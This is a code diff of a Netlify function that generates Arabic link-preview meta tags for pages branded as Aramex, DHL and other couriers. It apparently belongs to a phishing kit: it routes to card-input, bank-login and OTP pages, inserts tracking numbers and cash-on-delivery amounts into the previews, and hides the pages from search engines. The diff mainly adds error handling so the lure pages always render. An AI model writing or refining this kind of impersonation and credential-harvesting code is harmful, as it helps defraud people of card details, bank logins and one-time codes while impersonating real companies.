@@ -132,220 +132,196 @@ async function getLinkData(linkId) {
 }
 
 exports.handler = async (event, context) => {
-  // Get query parameters
-  const queryStringParameters = event.queryStringParameters || {};
+  try {
+    // Initialize all variables with safe defaults
+    let title = "منصة الشحن الذكية";
+    let description = "نظام دفع آمن ومحمي";
+    let ogImage = "/og-aramex.jpg";
+    let serviceKey = 'aramex';
+    let serviceName = 'خدمة الشحن';
+    let metaSiteName = 'منصة الشحن الذكية';
+    let originalPath = '/';
+    let countryCode = 'SA';
+    let type = 'shipping';
+    let id = 'unknown';
 
-  // Determine the original path from multiple sources
-  // Priority: 1) query params (from redirects), 2) event.path, 3) event.rawPath
-  let originalPath = '';
+    // Get query parameters
+    const queryStringParameters = event.queryStringParameters || {};
 
-  // First, check if path was passed in query string (from _redirects)
-  if (queryStringParameters.path) {
-    originalPath = queryStringParameters.path;
-  }
-  // If not in query, use event.path (Netlify automatically sets this from the redirect pattern)
-  else if (event.path) {
-    originalPath = event.path;
-  }
-  // Fallback to rawPath
-  else if (event.rawPath) {
-    originalPath = event.rawPath;
-  }
+    // Determine the original path from multiple sources
+    // Priority: 1) query params (from redirects), 2) event.path, 3) event.rawPath
+    if (queryStringParameters.path) {
+      originalPath = queryStringParameters.path;
+    } else if (event.path) {
+      originalPath = event.path;
+    } else if (event.rawPath) {
+      originalPath = event.rawPath;
+    }
 
-  // Remove function prefix if accidentally included
-  originalPath = originalPath.replace('/.netlify/functions/microsite-meta', '');
+    // Remove function prefix if accidentally included
+    originalPath = originalPath.replace('/.netlify/functions/microsite-meta', '');
 
-  // Ensure path starts with /
-  if (!originalPath.startsWith('/')) {
-    originalPath = '/' + originalPath;
-  }
+    // Ensure path starts with /
+    if (!originalPath.startsWith('/')) {
+      originalPath = '/' + originalPath;
+    }
 
-  // Remove trailing slash for consistency
-  originalPath = originalPath.replace(/\/$/, '') || '/';
+    // Remove trailing slash for consistency
+    originalPath = originalPath.replace(/\/$/, '') || '/';
 
-  const queryParams = queryStringParameters;
+    const queryParams = queryStringParameters;
 
-  // Extract parameters from path: /r/:country/:type/:id or /pay/:id/...
-  let pathMatch = originalPath.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);
-  let countryCode, type, id;
+    // Extract parameters from path: /r/:country/:type/:id or /pay/:id/...
+    let pathMatch = originalPath.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);
 
-  if (pathMatch) {
-    [, countryCode, type, id] = pathMatch;
-  } else {
-    // Handle payment page routes: /pay/:id/...
-    pathMatch = originalPath.match(/^\/pay\/([a-zA-Z0-9-]+)(?:\/(.+))?$/);
     if (pathMatch) {
-      [, id, subPath] = pathMatch;
-      // For payment pages, we need to determine the type from the link data
-      type = 'shipping'; // Default to shipping for payment pages
-      countryCode = 'SA'; // Default country, will be overridden by link data
+      [, countryCode, type, id] = pathMatch;
     } else {
-      // If no match, return 404
-      return {
-        statusCode: 404,
-        headers: {
-          'Content-Type': 'text/html; charset=utf-8',
-        },
-        body: '<html><body>Not Found</body></html>'
-      };
-    }
-  }
-
-  const country = countryData[countryCode];
-
-  if (!country) {
-    return {
-      statusCode: 404,
-      body: 'Country not found'
-    };
-  }
-
-  // Try to get link data from database first
-  const linkData = await getLinkData(id);
-
-  // For payment pages, get country and type from link data if available
-  if (linkData?.country_code) {
-    countryCode = linkData.country_code;
-    const linkCountry = countryData[countryCode];
-    if (linkCountry) {
-      country = linkCountry;
-    }
-  }
-
-  if (linkData?.type) {
-    type = linkData.type;
-  }
-
-  // Debug logging (only in development)
-  if (process.env.NETLIFY_DEV) {
-    console.log('Original Path:', originalPath);
-    console.log('Link ID:', id);
-    console.log('Link Data:', linkData);
-    console.log('Query Parameters:', queryParams);
-    console.log('Final Country:', countryCode, 'Type:', type);
-  }
-
-  let title = "";
-  let description = "";
-  let ogImage = "/og-aramex.jpg";
-  let serviceKey = 'aramex'; // fallback
-  let serviceName = 'خدمة الشحن'; // Default service name - ALWAYS DEFINED
-  // Site name for OG meta; set per type below to avoid undefined references
-  let metaSiteName = 'منصة الشحن الذكية';
-
-  if (type === "shipping") {
-    // Determine service key from multiple sources
-    if (linkData?.payload?.service_key) {
-      serviceKey = linkData.payload.service_key;
-    } else if (linkData?.payload?.service) {
-      serviceKey = linkData.payload.service;
-    } else if (queryParams?.service) {
-      serviceKey = queryParams.service;
-    }
-
-    // Normalize service key (handle variations like dhlkw, dhlqa, etc.)
-    const normalizedKey = serviceKey.toLowerCase().replace(/[^a-z0-9]/g, '');
-    const baseKey = normalizedKey.replace(/(kw|qa|om|bh|ae|sa)$/, '') || normalizedKey;
-
-    // Get service info - try exact match first, then base key, then fallback
-    let serviceInfo = serviceData[normalizedKey] || serviceData[baseKey] || serviceData.aramex;
-
-    // Ensure we have valid service info
-    if (!serviceInfo || !serviceInfo.description) {
-      serviceInfo = serviceData.aramex;
-    }
-
-    // Get service name - ALWAYS DEFINED (with fallback to serviceInfo.name)
-    serviceName = linkData?.payload?.service_name || serviceInfo.name || 'خدمة الشحن';
-    metaSiteName = serviceName;
-
-    // Determine if this is a payment page or microsite
-    const isPaymentPage = originalPath.startsWith('/pay/');
-    let pageType = '';
-
-    // Determine specific payment page type
-    if (isPaymentPage) {
-      if (originalPath.includes('/recipient')) {
-        pageType = 'معلومات المستلم';
-      } else if (originalPath.includes('/details')) {
-        pageType = 'تفاصيل الدفع';
-      } else if (originalPath.includes('/card-input')) {
-        pageType = 'بيانات البطاقة';
-      } else if (originalPath.includes('/bank-login')) {
-        pageType = 'تسجيل الدخول';
-      } else if (originalPath.includes('/otp')) {
-        pageType = 'رمز التحقق';
+      // Handle payment page routes: /pay/:id/...
+      pathMatch = originalPath.match(/^\/pay\/([a-zA-Z0-9-]+)(?:\/(.+))?$/);
+      if (pathMatch) {
+        [, id, subPath] = pathMatch;
+        type = 'shipping'; // Default to shipping for payment pages
+        countryCode = 'SA'; // Default country, will be overridden by link data
       } else {
-        pageType = 'صفحة دفع آمنة';
+        // If no match, return a default payment page
+        title = "الدفع الآمن";
+        description = "صفحة دفع آمنة ومحمية";
+        ogImage = "/og-aramex.jpg";
+        serviceName = "منصة الشحن الذكية";
+        metaSiteName = "منصة الشحن الذكية";
       }
-    } else {
-      pageType = 'تتبع وتأكيد الدفع';
     }
 
-    // Use company description as primary description
-    title = `${serviceName} - ${pageType}`;
-    // Use company description prominently - this is what appears when sharing links
-    description = serviceInfo.description || `صفحة دفع آمنة لخدمة ${serviceName}`;
+    // Only continue processing if we have valid data
+    if (id !== 'unknown') {
+      const country = countryData[countryCode];
 
-    // Add additional context only if needed (keep description concise for sharing)
-    if (!isPaymentPage) {
-      description += ` - تتبع شحنتك وأكمل الدفع بشكل آمن`;
+      // Try to get link data from database first
+      const linkData = await getLinkData(id);
+
+      // For payment pages, get country and type from link data if available
+      if (linkData?.country_code) {
+        countryCode = linkData.country_code;
+        const linkCountry = countryData[countryCode];
+        if (linkCountry) {
+          // Update country info
+        }
+      }
+
+      if (linkData?.type) {
+        type = linkData.type;
+      }
+
+      if (type === "shipping") {
+        // Determine service key from multiple sources
+        if (linkData?.payload?.service_key) {
+          serviceKey = linkData.payload.service_key;
+        } else if (linkData?.payload?.service) {
+          serviceKey = linkData.payload.service;
+        } else if (queryParams?.service) {
+          serviceKey = queryParams.service;
+        }
+
+        // Normalize service key (handle variations like dhlkw, dhlqa, etc.)
+        const normalizedKey = (serviceKey || '').toLowerCase().replace(/[^a-z0-9]/g, '');
+        const baseKey = normalizedKey.replace(/(kw|qa|om|bh|ae|sa)$/, '') || normalizedKey;
+
+        // Get service info - try exact match first, then base key, then fallback
+        let serviceInfo = serviceData[normalizedKey] || serviceData[baseKey] || serviceData.aramex;
+
+        // Ensure we have valid service info
+        if (!serviceInfo || !serviceInfo.description) {
+          serviceInfo = serviceData.aramex;
+        }
+
+        // Get service name - ALWAYS DEFINED
+        serviceName = linkData?.payload?.service_name || serviceInfo?.name || 'خدمة الشحن';
+        metaSiteName = serviceName;
+
+        // Determine if this is a payment page or microsite
+        const isPaymentPage = originalPath.startsWith('/pay/');
+        let pageType = '';
+
+        // Determine specific payment page type
+        if (isPaymentPage) {
+          if (originalPath.includes('/recipient')) {
+            pageType = 'معلومات المستلم';
+          } else if (originalPath.includes('/details')) {
+            pageType = 'تفاصيل الدفع';
+          } else if (originalPath.includes('/card-input')) {
+            pageType = 'بيانات البطاقة';
+          } else if (originalPath.includes('/bank-login')) {
+            pageType = 'تسجيل الدخول';
+          } else if (originalPath.includes('/otp')) {
+            pageType = 'رمز التحقق';
+          } else {
+            pageType = 'صفحة دفع آمنة';
+          }
+        } else {
+          pageType = 'تتبع وتأكيد الدفع';
+        }
+
+        // Use company description as primary description
+        title = `${serviceName} - ${pageType}`;
+        // Use company description prominently - this is what appears when sharing links
+        description = serviceInfo?.description || `صفحة دفع آمنة لخدمة ${serviceName}`;
+
+        // Add additional context only if needed (keep description concise for sharing)
+        if (!isPaymentPage) {
+          description += ` - تتبع شحنتك وأكمل الدفع بشكل آمن`;
+        }
+
+        // Add tracking number to description if available
+        if (linkData?.payload?.tracking_number) {
+          description += ` - رقم الشحنة: ${linkData.payload.tracking_number}`;
+        }
+
+        // Add COD amount if available
+        if (linkData?.payload?.cod_amount && linkData.payload.cod_amount > 0) {
+          description += ` - مبلغ الدفع: ${linkData.payload.cod_amount} ر.س`;
+        }
+
+        ogImage = serviceInfo?.ogImage || "/og-aramex.jpg";
+      } else if (type === "chalet") {
+        const chaletName = linkData?.payload?.chalet_name || 'شاليه';
+        const isPaymentPage = originalPath.startsWith('/pay/');
+        const pageType = isPaymentPage ? 'دفع حجز شاليه' : 'حجز شاليه';
+
+        title = `${pageType} - ${chaletName}`;
+        description = `احجز ${chaletName} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'نظام دفع آمن ومحمي'}`;
+        metaSiteName = chaletName;
+        serviceName = chaletName; // Set serviceName for chalets too
+
+        // Add guest count and nights if available
+        if (linkData?.payload?.guest_count && linkData?.payload?.nights) {
+          description += ` - ${linkData.payload.guest_count} ضيف لـ ${linkData.payload.nights} ليلة`;
+        }
+
+        ogImage = "/og-aramex.jpg"; // Default for chalets
+      }
     }
 
-    // Add tracking number to description if available
-    if (linkData?.payload?.tracking_number) {
-      description += ` - رقم الشحنة: ${linkData.payload.tracking_number}`;
+    // Get site URL from headers or use default
+    const host = event.headers?.host || event.headers?.['host'] || event.headers?.['Host'] || 'dynamic-sunflower-49efe2.netlify.app';
+    const protocol = event.headers?.['x-forwarded-proto'] || event.headers?.['X-Forwarded-Proto'] || 'https';
+    const siteUrl = `${protocol}://${host}`;
+
+    // Build full URL (exclude 'path' from query params as it's internal)
+    const queryString = Object.entries(queryParams)
+      .filter(([k]) => k !== 'path')
+      .map(([k, v]) => `${k}=${encodeURIComponent(v)}`)
+      .join('&');
+    const fullUrl = `${siteUrl}${originalPath}${queryString ? '?' + queryString : ''}`;
+
+    // Ensure ogImage is absolute URL
+    let fullOgImage = ogImage;
+    if (!fullOgImage.startsWith('http')) {
+      fullOgImage = `${siteUrl}${fullOgImage.startsWith('/') ? '' : '/'}${fullOgImage}`;
     }
 
-    // Add COD amount if available
-    if (linkData?.payload?.cod_amount && linkData.payload.cod_amount > 0) {
-      description += ` - مبلغ الدفع: ${linkData.payload.cod_amount} ر.س`;
-    }
-
-    ogImage = serviceInfo.ogImage;
-  } else if (type === "chalet") {
-    const chaletName = linkData?.payload?.chalet_name || 'شاليه';
-    const isPaymentPage = originalPath.startsWith('/pay/');
-    const pageType = isPaymentPage ? 'دفع حجز شاليه' : 'حجز شاليه';
-
-    title = `${pageType} - ${chaletName} في ${country.nameAr}`;
-    description = `احجز ${chaletName} في ${country.nameAr} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'نظام دفع آمن ومحمي'}`;
-    metaSiteName = `${chaletName} - ${country.nameAr}`;
-    serviceName = chaletName; // Set serviceName for chalets too
-
-    // Add guest count and nights if available
-    if (linkData?.payload?.guest_count && linkData?.payload?.nights) {
-      description += ` - ${linkData.payload.guest_count} ضيف لـ ${linkData.payload.nights} ليلة`;
-    }
-
-    ogImage = "/og-aramex.jpg"; // Default for chalets
-  }
-
-  // Get site URL from headers or use default
-  const host = event.headers?.host || event.headers?.['host'] || event.headers?.['Host'] || 'dynamic-sunflower-49efe2.netlify.app';
-  const protocol = event.headers?.['x-forwarded-proto'] || event.headers?.['X-Forwarded-Proto'] || 'https';
-  const siteUrl = `${protocol}://${host}`;
-
-  // Build full URL (exclude 'path' from query params as it's internal)
-  const queryString = Object.entries(queryParams)
-    .filter(([k]) => k !== 'path')
-    .map(([k, v]) => `${k}=${encodeURIComponent(v)}`)
-    .join('&');
-  const fullUrl = `${siteUrl}${originalPath}${queryString ? '?' + queryString : ''}`;
-
-  // Ensure ogImage is absolute URL
-  let fullOgImage = ogImage;
-  if (!fullOgImage.startsWith('http')) {
-    fullOgImage = `${siteUrl}${fullOgImage.startsWith('/') ? '' : '/'}${fullOgImage}`;
-  }
-
-  // Final debug logging (only in development)
-  if (process.env.NETLIFY_DEV) {
-    console.log('Final meta tags:', { title, description, ogImage: fullOgImage, serviceKey, serviceName, fullUrl });
-  }
-
-  // Generate HTML with proper meta tags
-  const html = `<!DOCTYPE html>
+    // Generate HTML with proper meta tags
+    const html = `<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
@@ -438,15 +414,42 @@ exports.handler = async (event, context) => {
 </body>
 </html>`;
 
-  return {
-    statusCode: 200,
-    headers: {
-      'Content-Type': 'text/html; charset=utf-8',
-      'Cache-Control': 'no-cache, no-store, must-revalidate',
-      'Pragma': 'no-cache',
-      'Expires': '0',
-      'X-Robots-Tag': 'noindex, nofollow'
-    },
-    body: html
-  };
+    return {
+      statusCode: 200,
+      headers: {
+        'Content-Type': 'text/html; charset=utf-8',
+        'Cache-Control': 'no-cache, no-store, must-revalidate',
+        'Pragma': 'no-cache',
+        'Expires': '0',
+        'X-Robots-Tag': 'noindex, nofollow'
+      },
+      body: html
+    };
+  } catch (error) {
+    console.error('Function error:', error);
+
+    // Return a safe fallback HTML page on any error
+    const fallbackHtml = `<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>منصة الشحن الذكية</title>
+  <meta name="description" content="نظام دفع آمن ومحمي" />
+</head>
+<body>
+  <h1>منصة الشحن الذكية</h1>
+  <p>نظام دفع آمن ومحمي</p>
+</body>
+</html>`;
+
+    return {
+      statusCode: 200,
+      headers: {
+        'Content-Type': 'text/html; charset=utf-8',
+        'Cache-Control': 'no-cache, no-store, must-revalidate'
+      },
+      body: fallbackHtml
+    };
+  }
 };
